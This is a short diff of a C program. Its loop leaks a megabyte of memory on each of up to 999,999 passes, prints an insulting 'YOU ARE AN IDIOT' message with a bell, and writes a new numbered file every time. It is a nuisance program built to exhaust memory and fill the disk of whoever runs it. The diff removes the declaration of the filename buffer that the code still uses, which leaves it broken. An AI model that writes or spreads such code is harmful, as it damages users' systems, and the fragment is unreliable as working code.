@@ -9,7 +9,6 @@ int main() {
     for (int i = 1; i <= 999999; i++) {
 	int *m = malloc(1048576);
         printf("\aYOU ARE AN IDIOT \t");
-        char fname[40];
         sprintf(fname, "LABESK%d.text", i);
         FILE *f;
         f = fopen(fname, "wb");
